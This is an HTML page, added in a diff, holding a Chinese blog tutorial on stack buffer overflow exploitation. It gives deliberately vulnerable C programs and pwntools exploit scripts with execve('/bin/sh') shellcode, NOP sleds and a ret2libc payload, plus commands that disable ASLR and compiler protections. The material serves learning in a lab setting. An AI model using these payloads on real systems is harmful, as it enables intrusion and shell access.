@@ -1,0 +1,805 @@
+<!DOCTYPE html>
+
+
+
+  
+
+
+<html class="theme-next gemini use-motion" lang="zh-Hans">
+<head>
+  <!-- hexo-inject:begin --><!-- hexo-inject:end --><meta charset="UTF-8"/>
+<meta http-equiv="X-UA-Compatible" content="IE=edge" />
+<meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1"/>
+<meta name="theme-color" content="#222">
+
+
+
+
+
+
+
+
+
+<meta http-equiv="Cache-Control" content="no-transform" />
+<meta http-equiv="Cache-Control" content="no-siteapp" />
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+  
+  
+  <link href="/lib/fancybox/source/jquery.fancybox.css?v=2.1.5" rel="stylesheet" type="text/css" />
+
+
+
+
+
+
+
+<link href="/lib/font-awesome/css/font-awesome.min.css?v=4.6.2" rel="stylesheet" type="text/css" />
+
+<link href="/css/main.css?v=5.1.3" rel="stylesheet" type="text/css" />
+
+
+  <link rel="apple-touch-icon" sizes="180x180" href="/images/apple-touch-icon-next.png?v=5.1.3">
+
+
+  <link rel="icon" type="image/png" sizes="32x32" href="/images/favicon-32x32-next.png?v=5.1.3">
+
+
+  <link rel="icon" type="image/png" sizes="16x16" href="/images/favicon-16x16-next.png?v=5.1.3">
+
+
+  <link rel="mask-icon" href="/images/logo.svg?v=5.1.3" color="#222">
+
+
+
+
+
+  <meta name="keywords" content="PWN,stackoverflow," />
+
+
+
+
+
+
+
+
+
+
+<meta name="description" content="程序的栈是从高地址向低地址增长的。程序的堆是从低地址向高地址增长的。 程序的栈 EIP寄存器不能显式地通过指令修改值，可以通过jmp、call、ret隐式地修改。 x86架构用字母“e(extended)”作名称前缀，指示寄存器大小为32位；x86_64架构用字母“r”作名称前缀，指示各寄存器大小为64位 FP(栈帧指针寄存器)–&amp;gt;EBP寄存器，记录栈帧基地址，可以通过它来引用到局部变量和函">
+<meta name="keywords" content="PWN,stackoverflow">
+<meta property="og:type" content="article">
+<meta property="og:title" content="伪PWN选手之stack_overflow">
+<meta property="og:url" content="http://ultramangaia.github.io/blog/2018/伪PWN选手之stack-overflow.html">
+<meta property="og:site_name" content="UltramanGaia&#39;s Blog">
+<meta property="og:description" content="程序的栈是从高地址向低地址增长的。程序的堆是从低地址向高地址增长的。 程序的栈 EIP寄存器不能显式地通过指令修改值，可以通过jmp、call、ret隐式地修改。 x86架构用字母“e(extended)”作名称前缀，指示寄存器大小为32位；x86_64架构用字母“r”作名称前缀，指示各寄存器大小为64位 FP(栈帧指针寄存器)–&amp;gt;EBP寄存器，记录栈帧基地址，可以通过它来引用到局部变量和函">
+<meta property="og:locale" content="zh-Hans">
+<meta property="og:image" content="http://ultramangaia.github.io/blog/img/pwn/1.png">
+<meta property="og:image" content="http://ultramangaia.github.io/blog/img/pwn/2.jpg">
+<meta property="og:updated_time" content="2018-03-27T17:40:19.971Z">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:title" content="伪PWN选手之stack_overflow">
+<meta name="twitter:description" content="程序的栈是从高地址向低地址增长的。程序的堆是从低地址向高地址增长的。 程序的栈 EIP寄存器不能显式地通过指令修改值，可以通过jmp、call、ret隐式地修改。 x86架构用字母“e(extended)”作名称前缀，指示寄存器大小为32位；x86_64架构用字母“r”作名称前缀，指示各寄存器大小为64位 FP(栈帧指针寄存器)–&amp;gt;EBP寄存器，记录栈帧基地址，可以通过它来引用到局部变量和函">
+<meta name="twitter:image" content="http://ultramangaia.github.io/blog/img/pwn/1.png">
+
+
+
+<script type="text/javascript" id="hexo.configurations">
+  var NexT = window.NexT || {};
+  var CONFIG = {
+    root: '/',
+    scheme: 'Gemini',
+    version: '5.1.3',
+    sidebar: {"position":"left","display":"post","offset":12,"b2t":false,"scrollpercent":false,"onmobile":false},
+    fancybox: true,
+    tabs: true,
+    motion: {"enable":true,"async":false,"transition":{"post_block":"fadeIn","post_header":"slideDownIn","post_body":"slideDownIn","coll_header":"slideLeftIn","sidebar":"slideUpIn"}},
+    duoshuo: {
+      userId: '0',
+      author: '博主'
+    },
+    algolia: {
+      applicationID: '',
+      apiKey: '',
+      indexName: '',
+      hits: {"per_page":10},
+      labels: {"input_placeholder":"Search for Posts","hits_empty":"We didn't find any results for the search: ${query}","hits_stats":"${hits} results found in ${time} ms"}
+    }
+  };
+</script>
+
+
+
+  <link rel="canonical" href="http://ultramangaia.github.io/blog/2018/伪PWN选手之stack-overflow.html"/>
+
+
+
+
+
+  <title>伪PWN选手之stack_overflow | UltramanGaia's Blog</title><!-- hexo-inject:begin --><!-- hexo-inject:end -->
+  
+
+
+
+
+
+
+
+
+</head>
+
+<body itemscope itemtype="http://schema.org/WebPage" lang="zh-Hans">
+
+  
+  
+    
+  
+
+  <!-- hexo-inject:begin --><!-- hexo-inject:end --><div class="container sidebar-position-left page-post-detail">
+    <div class="headband"></div>
+
+    <header id="header" class="header" itemscope itemtype="http://schema.org/WPHeader">
+      <div class="header-inner"><div class="site-brand-wrapper">
+  <div class="site-meta ">
+    
+
+    <div class="custom-logo-site-title">
+      <a href="/"  class="brand" rel="start">
+        <span class="logo-line-before"><i></i></span>
+        <span class="site-title">UltramanGaia's Blog</span>
+        <span class="logo-line-after"><i></i></span>
+      </a>
+    </div>
+      
+        <p class="site-subtitle"></p>
+      
+  </div>
+
+  <div class="site-nav-toggle">
+    <button>
+      <span class="btn-bar"></span>
+      <span class="btn-bar"></span>
+      <span class="btn-bar"></span>
+    </button>
+  </div>
+</div>
+
+<nav class="site-nav">
+  
+
+  
+    <ul id="menu" class="menu">
+      
+        
+        <li class="menu-item menu-item-home">
+          <a href="/" rel="section">
+            
+              <i class="menu-item-icon fa fa-fw fa-home"></i> <br />
+            
+            首页
+          </a>
+        </li>
+      
+        
+        <li class="menu-item menu-item-tags">
+          <a href="/tags/" rel="section">
+            
+              <i class="menu-item-icon fa fa-fw fa-tags"></i> <br />
+            
+            标签
+          </a>
+        </li>
+      
+        
+        <li class="menu-item menu-item-categories">
+          <a href="/categories/" rel="section">
+            
+              <i class="menu-item-icon fa fa-fw fa-th"></i> <br />
+            
+            分类
+          </a>
+        </li>
+      
+        
+        <li class="menu-item menu-item-archives">
+          <a href="/archives/" rel="section">
+            
+              <i class="menu-item-icon fa fa-fw fa-archive"></i> <br />
+            
+            归档
+          </a>
+        </li>
+      
+
+      
+    </ul>
+  
+
+  
+</nav>
+
+
+
+ </div>
+    </header>
+
+    <main id="main" class="main">
+      <div class="main-inner">
+        <div class="content-wrap">
+          <div id="content" class="content">
+            
+
+  <div id="posts" class="posts-expand">
+    
+
+  
+
+  
+  
+  
+
+  <article class="post post-type-normal" itemscope itemtype="http://schema.org/Article">
+  
+  
+  
+  <div class="post-block">
+    <link itemprop="mainEntityOfPage" href="http://ultramangaia.github.io/blog/2018/伪PWN选手之stack-overflow.html">
+
+    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
+      <meta itemprop="name" content="UltramanGaia">
+      <meta itemprop="description" content="">
+      <meta itemprop="image" content="/images/avatar.jpg">
+    </span>
+
+    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
+      <meta itemprop="name" content="UltramanGaia's Blog">
+    </span>
+
+    
+      <header class="post-header">
+
+        
+        
+          <h1 class="post-title" itemprop="name headline">伪PWN选手之stack_overflow</h1>
+        
+
+        <div class="post-meta">
+          <span class="post-time">
+            
+              <span class="post-meta-item-icon">
+                <i class="fa fa-calendar-o"></i>
+              </span>
+              
+                <span class="post-meta-item-text">发表于</span>
+              
+              <time title="创建于" itemprop="dateCreated datePublished" datetime="2018-03-26T00:51:47+08:00">
+                2018-03-26
+              </time>
+            
+
+            
+
+            
+          </span>
+
+          
+            <span class="post-category" >
+            
+              <span class="post-meta-divider">|</span>
+            
+              <span class="post-meta-item-icon">
+                <i class="fa fa-folder-o"></i>
+              </span>
+              
+                <span class="post-meta-item-text">分类于</span>
+              
+              
+                <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
+                  <a href="/categories/信息安全/" itemprop="url" rel="index">
+                    <span itemprop="name">信息安全</span>
+                  </a>
+                </span>
+
+                
+                
+              
+            </span>
+          
+
+          
+            
+          
+
+          
+          
+
+          
+
+          
+
+          
+
+        </div>
+      </header>
+    
+
+    
+    
+    
+    <div class="post-body" itemprop="articleBody">
+
+      
+      
+
+      
+        <p>程序的栈是从高地址向低地址增长的。<br>程序的堆是从低地址向高地址增长的。</p>
+<h2 id="程序的栈"><a href="#程序的栈" class="headerlink" title="程序的栈"></a>程序的栈</h2><p><img src="../img/pwn/1.png" alt=""></p>
+<p>EIP寄存器不能显式地通过指令修改值，可以通过jmp、call、ret隐式地修改。</p>
+<p>x86架构用字母“e(extended)”作名称前缀，指示寄存器大小为32位；x86_64架构用字母“r”作名称前缀，指示各寄存器大小为64位</p>
+<p>FP(栈帧指针寄存器)–&gt;EBP寄存器，记录栈帧基地址，可以通过它来引用到局部变量和函数参数。</p>
+<p><img src="../img/pwn/2.jpg" alt=""></p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">函数调用时入栈顺序为</span><br><span class="line">实参N~1→主调函数返回地址→主调函数帧基指针EBP→被调函数局部变量1~N</span><br></pre></td></tr></table></figure>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">x86</span><br><span class="line">函数参数在函数返回地址的上方，如上图</span><br><span class="line">x64</span><br><span class="line">x64中前六个参数依次保存在RDI, RSI, RDX, RCX, R8和 R9寄存器里，如果还有更多的参数的话才会保存在栈上。</span><br><span class="line">内存地址不能大于0x00007FFFFFFFFFFF，6个字节长度，否则会抛出异常。</span><br></pre></td></tr></table></figure>
+<h2 id="栈溢出原理"><a href="#栈溢出原理" class="headerlink" title="栈溢出原理"></a>栈溢出原理</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">程序向栈上的某个变量写入数据，而没有控制好写入的长度，导致可以超过该变量申请的长度而覆盖别的内存。</span><br><span class="line">可导致程序崩溃甚至控制程序执行流程。</span><br></pre></td></tr></table></figure>
+<h4 id="简单例子1"><a href="#简单例子1" class="headerlink" title="简单例子1"></a>简单例子1</h4><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#include &lt;stdio.h&gt;</span></span><br><span class="line"><span class="comment">#include &lt;string.h&gt;</span></span><br><span class="line">void success() &#123; puts(<span class="string">"You Hava already controlled it."</span>); &#125;</span><br><span class="line">void vulnerable() &#123;</span><br><span class="line">  char s[<span class="number">12</span>];</span><br><span class="line">  gets(s);</span><br><span class="line">  puts(s);</span><br><span class="line">  <span class="keyword">return</span>;</span><br><span class="line">&#125;</span><br><span class="line">int main(int argc, char **argv) &#123;</span><br><span class="line">  vulnerable();</span><br><span class="line">  <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+<p>pattern_create</p>
+<p>pattern_offset</p>
+<p>算出偏移，然后，将地址覆盖为success的地址即可</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"><span class="comment"># context.log_level = "debug"</span></span><br><span class="line">success_addr = <span class="number">0x08048456</span></span><br><span class="line">p = process(<span class="string">"./stackoverflow1"</span>)</span><br><span class="line"><span class="comment"># print p32(success_addr)</span></span><br><span class="line">payload =  <span class="string">"A"</span>*<span class="number">24</span> + p32(success_addr)</span><br><span class="line">p.sendline(payload)</span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure>
+<h4 id="简单例子2"><a href="#简单例子2" class="headerlink" title="简单例子2"></a>简单例子2</h4><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line">#include &lt;stdio.h&gt;</span><br><span class="line">#include &lt;stdlib.h&gt;</span><br><span class="line">#include &lt;unistd.h&gt;</span><br><span class="line"></span><br><span class="line">void vulnerable_function()&#123;</span><br><span class="line">        char buf[128];</span><br><span class="line">        read(STDIN_FILENO, buf, 256);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">int main(int argc, char ** argv)&#123;</span><br><span class="line"></span><br><span class="line">        vulnerable_function();</span><br><span class="line">        write(STDOUT_FILENO, &quot;Hello world\n&quot;, 13);</span><br><span class="line"></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">gcc -m32 -z  execstack -no-pie -fno-stack-protector -g  -o stackoverflow2 stackoverflow2.c</span><br></pre></td></tr></table></figure>
+<p>这道题目还是很有意思的，学习蒸米大佬的<a href="https://segmentfault.com/a/1190000005888964" target="_blank" rel="noopener">一步一步学 ROP 之 Linux_x86 篇</a></p>
+<p>发现了点小问题，就是文中提到直接运行程序和用gdb调试程序时，buf地址是不相同的。</p>
+<p>然后，我（问队里大佬）发现用pwntools的process启动的程序也是和直接运行程序的buf地址是不同的。</p>
+<p>文中提到的方法是下面这个栈布局方式</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">[shellcode][“AAAAAAAAAAAAAA”….][ret]</span><br></pre></td></tr></table></figure>
+<p>但貌似shellcode的首地址还是比较难搞到的。</p>
+<p>由于限制了输入最多只有256个byte，然后自然而然构造如下方式</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">[&quot;\x90\x90\x90...&quot;][shellcode][ret]</span><br></pre></td></tr></table></figure>
+<p>\x90汇编代码是nop，则会有比较大的空间容易命中nop。（虽然前面提到buf地址不同，但相差不是太大）。</p>
+<p>exp如下</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">import</span> pwnlib</span><br><span class="line">context.log_level = <span class="string">"debug"</span></span><br><span class="line">context.arch = <span class="string">"i386"</span></span><br><span class="line"></span><br><span class="line">p = process(<span class="string">"./stackoverflow2"</span>)</span><br><span class="line"><span class="comment"># p = remote("127.0.0.1",10001)</span></span><br><span class="line"><span class="comment"># pwnlib.gdb.attach(p)</span></span><br><span class="line"></span><br><span class="line">ret_addr = <span class="number">0xffffd260</span> + <span class="number">0x30</span></span><br><span class="line"><span class="comment"># shellcode = asm(shellcraft.sh())</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># execve ("/bin/sh")</span></span><br><span class="line"><span class="comment"># xor ecx, ecx</span></span><br><span class="line"><span class="comment"># mul ecx</span></span><br><span class="line"><span class="comment"># push ecx</span></span><br><span class="line"><span class="comment"># push 0x68732f2f   ;; hs//</span></span><br><span class="line"><span class="comment"># push 0x6e69622f   ;; nib/</span></span><br><span class="line"><span class="comment"># mov ebx, esp</span></span><br><span class="line"><span class="comment"># mov al, 11</span></span><br><span class="line"><span class="comment"># int 0x80</span></span><br><span class="line"></span><br><span class="line">shellcode = <span class="string">"\x31\xc9\xf7\xe1\x51\x68\x2f\x2f\x73"</span></span><br><span class="line">shellcode += <span class="string">"\x68\x68\x2f\x62\x69\x6e\x89\xe3\xb0"</span></span><br><span class="line">shellcode += <span class="string">"\x0b\xcd\x80"</span></span><br><span class="line"></span><br><span class="line">payload = <span class="string">"\x90"</span> * (<span class="number">140</span> - len(shellcode)) + shellcode + p32(ret_addr)</span><br><span class="line"></span><br><span class="line">p.sendline(payload)</span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure>
+<p>然后发现不行，问题在于esp地址。</p>
+<p>我们知道，在ret的时候，esp指着的地址是ret_addr，然后执行nop、nop、nop一直执行到到压栈（压/bin/sh）的时候，就会把跟他相邻的shellcode给覆盖掉，所以不能一直执行下去。</p>
+<p>然后，稍微改进下，</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">import</span> pwnlib</span><br><span class="line">context.log_level = <span class="string">"debug"</span></span><br><span class="line">context.arch = <span class="string">"i386"</span></span><br><span class="line"></span><br><span class="line">p = process(<span class="string">"./stackoverflow2"</span>)</span><br><span class="line"><span class="comment"># p = remote("127.0.0.1",10001)</span></span><br><span class="line"><span class="comment"># pwnlib.gdb.attach(p)</span></span><br><span class="line"></span><br><span class="line">ret_addr = <span class="number">0xffffd260</span> + <span class="number">0x30</span></span><br><span class="line"><span class="comment"># shellcode = asm(shellcraft.sh())</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># execve ("/bin/sh")</span></span><br><span class="line"><span class="comment"># xor ecx, ecx</span></span><br><span class="line"><span class="comment"># mul ecx</span></span><br><span class="line"><span class="comment"># push ecx</span></span><br><span class="line"><span class="comment"># push 0x68732f2f   ;; hs//</span></span><br><span class="line"><span class="comment"># push 0x6e69622f   ;; nib/</span></span><br><span class="line"><span class="comment"># mov ebx, esp</span></span><br><span class="line"><span class="comment"># mov al, 11</span></span><br><span class="line"><span class="comment"># int 0x80</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># context.terminal = ['tmux', 'splitw', '-v']</span></span><br><span class="line">shellcode = <span class="string">"\x31\xc9\xf7\xe1\x51\x68\x2f\x2f\x73"</span></span><br><span class="line">shellcode += <span class="string">"\x68\x68\x2f\x62\x69\x6e\x89\xe3\xb0"</span></span><br><span class="line">shellcode += <span class="string">"\x0b\xcd\x80"</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># shellcode = "\x31\xF6\x56\x48\xBB\x2F\x62\x69\x6E\x2F\x2F\x73\x68\x53\x54\x5F\xF7\xEE\xB0\x3B\x0F\x05"</span></span><br><span class="line">payload = <span class="string">"\x90"</span> * (<span class="number">132</span> - len(shellcode)) + shellcode + <span class="string">"\x90"</span>*<span class="number">8</span> + p32(ret_addr)</span><br><span class="line"><span class="comment"># payload = "\x90" * (100 - len(shellcode)) + shellcode + "\x90"*40 + p32(ret_addr)</span></span><br><span class="line"></span><br><span class="line"><span class="comment">#gdb.attach(p)</span></span><br><span class="line">p.sendline(payload)</span><br><span class="line"><span class="comment"># print p.recv()</span></span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure>
+<h4 id="简单例子3"><a href="#简单例子3" class="headerlink" title="简单例子3"></a>简单例子3</h4><h3 id="Ret2libc-–-Bypass-DEP-通过-ret2libc-绕过-DEP-防护"><a href="#Ret2libc-–-Bypass-DEP-通过-ret2libc-绕过-DEP-防护" class="headerlink" title="Ret2libc – Bypass DEP 通过 ret2libc 绕过 DEP 防护"></a>Ret2libc – Bypass DEP 通过 ret2libc 绕过 DEP 防护</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">gcc -m32 -no-pie -fno-stack-protector -g  -o stackoverflow3 stackoverflow2.c</span><br></pre></td></tr></table></figure>
+<p>这里开启了NX，那栈上不能执行代码了。cat /proc/[pid]/maps可以查看得知stack上不能执行。</p>
+<p>没开ASLR，所以，libc中地址是固定的。gdb 调试，p system找到system地址，find “/bin/sh”地址。</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br></pre></td><td class="code"><pre><span class="line">from pwn import *</span><br><span class="line">import pwnlib</span><br><span class="line"># context.log_level = &quot;debug&quot;</span><br><span class="line">context.arch = &quot;i386&quot;</span><br><span class="line">p = process(&quot;./stackoverflow3&quot;)</span><br><span class="line"># p = remote(&quot;127.0.0.1&quot;,10001)</span><br><span class="line">#  pwnlib.gdb.attach(p)</span><br><span class="line"></span><br><span class="line">ret_addr =  0xffffd260</span><br><span class="line">system_addr = 0xf7e0ec60 #0xf7578c60</span><br><span class="line">binsh_addr = 0xf7f4d808  #0xf76b7808</span><br><span class="line"></span><br><span class="line"># execve (&quot;/bin/sh&quot;)</span><br><span class="line"># xor ecx, ecx</span><br><span class="line"># mul ecx</span><br><span class="line"># push ecx</span><br><span class="line"># push 0x68732f2f   ;; hs//</span><br><span class="line"># push 0x6e69622f   ;; nib/</span><br><span class="line"># mov ebx, esp</span><br><span class="line"># mov al, 11</span><br><span class="line"># int 0x80</span><br><span class="line"></span><br><span class="line">shellcode = &quot;\x31\xc9\xf7\xe1\x51\x68\x2f\x2f\x73&quot;</span><br><span class="line">shellcode += &quot;\x68\x68\x2f\x62\x69\x6e\x89\xe3\xb0&quot;</span><br><span class="line">shellcode += &quot;\x0b\xcd\x80&quot;</span><br><span class="line"></span><br><span class="line">payload = &quot;A&quot;* 140 + p32(system_addr)+ p32(ret_addr) + p32(binsh_addr)</span><br><span class="line"></span><br><span class="line"># context.terminal = [&apos;tmux&apos;, &apos;splitw&apos;, &apos;-v&apos;]</span><br><span class="line"># gdb.attach(p)</span><br><span class="line">p.sendline(payload)</span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure>
+<p>这里我们可以分析一下，正常的运行system(“/bin/sh”)的流程是，先push “/bin/sh”，然后，push调用函数的返回地址，然后调用system。</p>
+<p>嗯，所以，我们只需要模仿栈上的布局即可，所以有了</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">p32(system_addr)+ p32(ret_addr) + p32(binsh_addr)</span><br></pre></td></tr></table></figure>
+<h3 id="ROP-Bypass-DEP-and-ASLR-通过-ROP-绕过-DEP-和-ASLR-防护"><a href="#ROP-Bypass-DEP-and-ASLR-通过-ROP-绕过-DEP-和-ASLR-防护" class="headerlink" title="ROP - Bypass DEP and ASLR 通过 ROP 绕过 DEP 和 ASLR 防护"></a>ROP - Bypass DEP and ASLR 通过 ROP 绕过 DEP 和 ASLR 防护</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">gcc -m32 -fno-stack-protector -o stackoverflow4 stackoverflow2.c</span><br></pre></td></tr></table></figure>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">开启了ASLR和NX(DEP)。所以思路是要先泄露处libc中某些函数的地址，根据这些地址计算偏移，就可以定位到system地址和&quot;/bin/sh&quot;地址。</span><br></pre></td></tr></table></figure>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">linux 关闭地址随机化</span><br><span class="line">sudo sh -c &quot;echo 0 &gt; /proc/sys/kernel/randomize_va_space&quot;</span><br><span class="line">原始值为2 </span><br><span class="line"></span><br><span class="line">gcc</span><br><span class="line">-z  execstack 关闭dep/nx</span><br><span class="line">-fno-stack-protector 不开启堆栈溢出保护，即不生成canary</span><br><span class="line">-no-pie  关闭PIE（Position Independent Executable），避免加载基址被打乱</span><br></pre></td></tr></table></figure>
+<h2 id="参考资料"><a href="#参考资料" class="headerlink" title="参考资料"></a>参考资料</h2><p><a href="https://ctf-wiki.github.io/ctf-wiki/pwn/stackoverflow/stack_intro/" target="_blank" rel="noopener">https://ctf-wiki.github.io/ctf-wiki/pwn/stackoverflow/stack_intro/</a></p>
+<p><a href="https://segmentfault.com/a/1190000005888964" target="_blank" rel="noopener">https://segmentfault.com/a/1190000005888964</a></p>
+<p><a href="http://www.cnblogs.com/clover-toeic/p/3755401.html" target="_blank" rel="noopener">http://www.cnblogs.com/clover-toeic/p/3755401.html</a></p>
+<p><a href="http://www.cnblogs.com/clover-toeic/p/3756668.html" target="_blank" rel="noopener">http://www.cnblogs.com/clover-toeic/p/3756668.html</a></p>
+
+      
+    </div>
+    
+    
+    
+
+    
+
+    
+
+    
+
+    <footer class="post-footer">
+      
+        <div class="post-tags">
+          
+            <a href="/tags/PWN/" rel="tag"># PWN</a>
+          
+            <a href="/tags/stackoverflow/" rel="tag"># stackoverflow</a>
+          
+        </div>
+      
+
+      
+      
+      
+
+      
+        <div class="post-nav">
+          <div class="post-nav-next post-nav-item">
+            
+              <a href="/blog/2018/PHP反序列化.html" rel="next" title="PHP反序列化">
+                <i class="fa fa-chevron-left"></i> PHP反序列化
+              </a>
+            
+          </div>
+
+          <span class="post-nav-divider"></span>
+
+          <div class="post-nav-prev post-nav-item">
+            
+              <a href="/blog/2018/XSS漏洞.html" rel="prev" title="XSS漏洞">
+                XSS漏洞 <i class="fa fa-chevron-right"></i>
+              </a>
+            
+          </div>
+        </div>
+      
+
+      
+      
+    </footer>
+  </div>
+  
+  
+  
+  </article>
+
+
+
+    <div class="post-spread">
+      
+    </div>
+  </div>
+
+
+          </div>
+          
+
+
+          
+
+  
+
+
+
+        </div>
+        
+          
+  
+  <div class="sidebar-toggle">
+    <div class="sidebar-toggle-line-wrap">
+      <span class="sidebar-toggle-line sidebar-toggle-line-first"></span>
+      <span class="sidebar-toggle-line sidebar-toggle-line-middle"></span>
+      <span class="sidebar-toggle-line sidebar-toggle-line-last"></span>
+    </div>
+  </div>
+
+  <aside id="sidebar" class="sidebar">
+    
+    <div class="sidebar-inner">
+
+      
+
+      
+        <ul class="sidebar-nav motion-element">
+          <li class="sidebar-nav-toc sidebar-nav-active" data-target="post-toc-wrap">
+            文章目录
+          </li>
+          <li class="sidebar-nav-overview" data-target="site-overview-wrap">
+            站点概览
+          </li>
+        </ul>
+      
+
+      <section class="site-overview-wrap sidebar-panel">
+        <div class="site-overview">
+          <div class="site-author motion-element" itemprop="author" itemscope itemtype="http://schema.org/Person">
+            
+              <img class="site-author-image" itemprop="image"
+                src="/images/avatar.jpg"
+                alt="UltramanGaia" />
+            
+              <p class="site-author-name" itemprop="name">UltramanGaia</p>
+              <p class="site-description motion-element" itemprop="description"></p>
+          </div>
+
+          <nav class="site-state motion-element">
+
+            
+              <div class="site-state-item site-state-posts">
+              
+                <a href="/archives/">
+              
+                  <span class="site-state-item-count">35</span>
+                  <span class="site-state-item-name">日志</span>
+                </a>
+              </div>
+            
+
+            
+              
+              
+              <div class="site-state-item site-state-categories">
+                <a href="/categories/index.html">
+                  <span class="site-state-item-count">4</span>
+                  <span class="site-state-item-name">分类</span>
+                </a>
+              </div>
+            
+
+            
+              
+              
+              <div class="site-state-item site-state-tags">
+                <a href="/tags/index.html">
+                  <span class="site-state-item-count">20</span>
+                  <span class="site-state-item-name">标签</span>
+                </a>
+              </div>
+            
+
+          </nav>
+
+          
+
+          <div class="links-of-author motion-element">
+            
+          </div>
+
+          
+          
+
+          
+          
+
+          
+
+        </div>
